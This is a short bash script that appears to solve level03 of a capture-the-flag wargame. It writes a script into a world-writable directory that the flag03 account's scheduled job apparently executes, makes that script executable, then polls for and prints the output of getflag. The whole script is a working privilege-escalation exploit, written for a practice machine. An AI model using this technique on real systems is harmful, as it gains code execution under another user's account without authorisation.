#!/usr/bin/env bash

cat >/home/flag03/writable.d/getflag <<EOF
#!/usr/bin/env bash
getflag >/tmp/flag03
EOF
chmod ugo=rwx /home/flag03/writable.d/getflag

while [[ ! -f /tmp/flag03 ]]; do echo -n "."; sleep 1; done; echo

cat /tmp/flag03
rm -f /tmp/flag03
